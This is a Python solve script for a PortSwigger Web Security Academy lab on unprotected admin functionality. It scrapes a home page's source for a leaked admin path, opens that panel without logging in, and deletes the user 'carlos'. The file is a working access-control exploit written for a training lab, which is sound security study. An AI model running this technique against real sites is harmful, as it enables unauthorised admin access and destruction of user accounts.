# Lab 02 — Unprotected admin functionality with unpredictable URL
# PortSwigger: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url
#
# Vulnerability: Admin panel at a genuinely random path — but the path is
#                disclosed in the home page's HTML/JS source
# Aim:           Find the admin panel and delete carlos
#
# Technique:
#   robots.txt won't help this time (no Disallow entry for a random path
#   you can't predict). Instead, the path is leaked directly in the page
#   source of the home page — often inside an HTML comment or a <script> tag.
#
# Usage: python access_control_lab02.py <url>

import sys
import re
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, check_status

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 02 — UNPROTECTED ADMIN FUNCTIONALITY (UNPREDICTABLE URL)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: fetch home page and search source for an admin path ─────────
    print("  ── Step 1: scan home page source for a disclosed admin path\n")
    r = session.get(url)

    # Look for any href/src/comment referencing something admin-like
    matches = re.findall(r'href=["\']([^"\']*admin[^"\']*)["\']', r.text, re.IGNORECASE)
    matches += re.findall(r'<!--.*?(/admin[^\s"\'<>]*).*?-->', r.text, re.IGNORECASE)

    if not matches:
        print("  ✘  No admin-like path found automatically — check page source manually")
        print(f"     curl -s {url} | grep -i admin")
        sys.exit(1)

    admin_path = matches[0]
    print(f"  ✔  Found candidate admin path: {admin_path}\n")

    # ── Step 2: access it directly, no login required ────────────────────────
    print("  ── Step 2: access the admin panel with NO authentication\n")
    r2 = session.get(f"{url}{admin_path}" if admin_path.startswith("/") else f"{url}/{admin_path}")
    check_status(r2, 200, "Admin panel access")

    if "carlos" in r2.text:
        print("  ✔  'carlos' user found on the admin panel\n")

    # ── Step 3: delete carlos ─────────────────────────────────────────────────
    print("  ── Step 3: delete carlos\n")
    delete_url = f"{url}{admin_path}/delete"
    r3 = session.post(delete_url, data={"username": "carlos"})
    check_status(r3, [200, 302], "Delete carlos")

    print()
    print(f"  ℹ  Admin panel found at: {admin_path}")
    print("     Unpredictability ≠ access control — the path leaked via page source.")
